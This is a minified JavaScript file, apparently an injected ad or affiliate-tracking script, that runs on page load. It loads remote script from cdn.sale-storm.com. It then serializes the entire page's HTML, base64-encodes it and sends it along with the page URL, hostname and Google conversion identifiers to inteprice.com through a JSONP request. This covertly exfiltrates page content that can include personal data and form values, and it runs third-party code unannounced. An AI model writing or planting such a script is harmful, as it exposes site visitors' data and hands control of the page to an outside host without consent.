(function(b,n){function A(a){/in/.test(n.readyState)?setTimeout(A,9,a):a()}function C(){if(v.Conv){D(v.Conv);var a=B(n);y(g.dir,g.name,f,"",x,a,v.Conv)}else a=B(n),y(g.dir,g.name,f,"",x,a)}function y(a,c,p,d,m,w,r){var e=function(a){b.console&&b.console.log&&b.console.log(a.result)},g=z?(n.location.protocol?"https":"http")+"://inteprice.com/net/test/?callback=":(n.location.protocol?"https":"http")+"://inteprice.com/net/?callback=",h="jsonIP"+ +new Date;b[h]=function(a){e&&e(a)};n.getElementsByTagName("head")[0].appendChild(function(){var b=n.createElement("script");b.type="text/javascript";b.charset="utf-8";var e="";r&&(r.google_conversion_id&&(e+="&id="+encodeURIComponent(r.google_conversion_id)),r.google_conversion_label&&(e+="&la="+encodeURIComponent(r.google_conversion_label)),r.google_conversion_value&&(e+="&va="+encodeURIComponent(r.google_conversion_value)),r.google_conversion_currency&&(e+="&cu="+encodeURIComponent(r.google_conversion_currency)));var f=w?"&l="+encodeURIComponent(k.encode(w)):"";b.src=g+h+"&d="+encodeURIComponent(a)+"&n="+encodeURIComponent(c)+"&i="+encodeURIComponent(p)+"&t="+encodeURIComponent(d)+"&h="+encodeURIComponent(m)+e+f;return b}())}function B(a){return a.outerHTML||(new XMLSerializer).serializeToString(a)}function E(a,c){function p(a,c,d){a/=d?700:2;a+=~~(a/c);for(c=0;455<a;c+=36)a=~~(a/35);return c+~~(36*a/(a+38))}function d(a,c){for(var d=1114112,b=0,p=a.length;b<p;++b){var l=a[b];l>=c&&l<d&&(d=l)}if(1114112<=d)throw Error("Next smallest code point not found.");return d}function b(a){return a+(26>a?97:22)}function g(a){if(48<=a&&57>=a)return a-22;if(65<=a&&90>=a)return a-65;if(97<=a&&122>=a)return a-97;throw Error("Illegal digit #"+a);}function r(a,c){for(var d=[],p=36,e=c;;p+=36){var l=p<=a+1?1:p>=a+26?26:p-a;if(e<l){d.push(b(e));break}else d.push(b(l+(e-l)%(36-l))),e=~~((e-l)/(36-l))}return d}function e(a){if("string"!=typeof a)return a;a=a.split("").map(function(a){return a.charCodeAt(0)});for(var c=[],b=[],e=0,g=a.length;e<g;++e){var l=a[e];128>l?c.push(l):b.push(l)}var h,f;(h=f=c.length)&&c.push(45);for(var k=128,w=72,m=0,g=a.length;f<g;++k,++m)for(e=d(b,k),m+=(e-k)*(f+1),k=e,e=0;e<g;++e)if(l=a[e],l<k){if(++m==n)throw Error("Delta overflow.");}else l==k&&(c=c.concat(r(w,m)),w=p(m,f+1,h==f),m=0,f++);return String.fromCharCode.apply(String,c)}function h(a){if("string"!=typeof a)return a;var c=1+a.lastIndexOf("-");a=a.split("").map(function(a){return a.charCodeAt(0)});for(var d=a.slice(0,c?c-1:0),b=128,e=72,l=0,f=a.length;c<f;++l){for(var k=l,m=36,r=1;;m+=36){var n=g(a[c++]),l=l+n*r,q=m<=e+1?1:m>=e+26?26:m-e;if(n<q)break;r*=36-q}m=1+d.length;e=p(l-k,m,0==k);b+=~~(l/m);l%=m;d.splice(l,0,b)}return String.fromCharCode.apply(String,d)}if("string"!=typeof a||""==a)return a;a=a.toLowerCase();var n=Math.pow(2,53);a=a.split(".");if(c)for(var q=0,k=a.length;q<k;++q){if(""!=a[q]&&"xn--"==a[q].substring(0,4)){var f=a[q].substring(4),u=h(f);u!=f&&(a[q]=u)}}else for(q=0,k=a.length;q<k;++q){var u=e(a[q]),t=u.length,f=u.substring(t-1,t);"-"==f&&u.substring(0,t-1)==a[q]||""==u||(a[q]="xn--"+u)}return a=a.join(".")}var g={dir:"main",name:"Ipadsmaincpa0916"};if(b[g.name])b.console&&b.console.log&&b.console.log("dublicate "+g.name);else{b[g.name]={};b[g.name].IpCpA=void 0;var v=b[g.name];v.strip_www=function(a){return"www."==a.substr(0,4)||"wap."==a.substr(0,4)?a.substr(4,a.length):"m."==a.substr(0,2)?a.substr(2,a.length):a};var f=v.strip_www(b.location.hostname),x=b.location.href;if(""==f)var z=1,f="test.com",x="http://test.com";else z=0;var f=E(f),D=function(a){"function"==typeof b.google_trackConversion?"undefined"!=typeof a&&(b.google_trackConversion(a),b.console&&b.console.log&&b.console.log("check Conversion")):function(){var c=n.createElement("script");c.type="text/javascript";c.async=!0;c.charset="utf-8";c.src=("https:"==n.location.protocol?"https":"http")+"://www.googleadservices.com/pagead/conversion_async.js";c.onreadystatechange=c.onload=c.onerror=function(){var d=c.readyState;if(!d||d&&("loaded"==d||"complete"==d)){var p=function(){"function"==typeof b.google_trackConversion?(b.google_trackConversion(a),b.console&&b.console.log&&b.console.log("check Conversion")):setTimeout(function(){k++;5>=k&&p()},200)};c.onreadystatechange=c.onload=c.onerror=null;var k=0;"undefined"!=typeof a&&p()}};var p=n.getElementsByTagName("script")[0];p?p.parentNode.insertBefore(c,p):n.documentElement.firstChild.appendChild(c)}()},t=z?g.dir+"/domains/":"https://cdn.sale-storm.com/wd/net/"+g.dir+"/domains/",t=t+f+"-sets.js",h=n.createElement("script");h.type="text/javascript";h.charset="utf-8";h.async=!0;h.src=t;h.onreadystatechange=h.onload=h.onerror=function(){var a=h.readyState;if(!a||a&&("loaded"==a||"complete"==a))h.onreadystatechange=h.onload=h.onerror=null,setTimeout(function(){void 0!==b[g.name].IpCpA?C():A(function(){y(g.dir,g.name,f,"UNKNOWN",x)})},200)};(t=n.getElementsByTagName("script")[0])?t.parentNode.insertBefore(h,t):n.documentElement.firstChild.appendChild(h);var k={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){var c="",b,d,m,f,g,e,h=0;for(a=k._utf8_encode(a);h<a.length;)b=a.charCodeAt(h++),d=a.charCodeAt(h++),m=a.charCodeAt(h++),f=b>>2,b=(b&3)<<4|d>>4,g=(d&15)<<2|m>>6,e=m&63,isNaN(d)?g=e=64:isNaN(m)&&(e=64),c=c+k._keyStr.charAt(f)+k._keyStr.charAt(b)+k._keyStr.charAt(g)+k._keyStr.charAt(e);return c},decode:function(a){var c="",b,d,g,f,h,e=0;for(a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");e<a.length;)b=k._keyStr.indexOf(a.charAt(e++)),d=k._keyStr.indexOf(a.charAt(e++)),f=k._keyStr.indexOf(a.charAt(e++)),h=k._keyStr.indexOf(a.charAt(e++)),b=b<<2|d>>4,d=(d&15)<<4|f>>2,g=(f&3)<<6|h,c+=String.fromCharCode(b),64!=f&&(c+=String.fromCharCode(d)),64!=h&&(c+=String.fromCharCode(g));return c=k._utf8_decode(c)},_utf8_encode:function(a){a=a.replace(/\r\n/g,"\n");for(var c="",b=0;b<a.length;b++){var d=a.charCodeAt(b);128>d?c+=String.fromCharCode(d):(127<d&&2048>d?c+=String.fromCharCode(d>>6|192):(c+=String.fromCharCode(d>>12|224),c+=String.fromCharCode(d>>6&63|128)),c+=String.fromCharCode(d&63|128))}return c},_utf8_decode:function(a){var c="",b=0,d;for(c1=c2=0;b<a.length;)d=a.charCodeAt(b),128>d?(c+=String.fromCharCode(d),b++):191<d&&224>d?(c2=a.charCodeAt(b+1),c+=String.fromCharCode((d&31)<<6|c2&63),b+=2):(c2=a.charCodeAt(b+1),c3=a.charCodeAt(b+2),c+=String.fromCharCode((d&15)<<12|(c2&63)<<6|c3&63),b+=3);return c}}}})(window,document);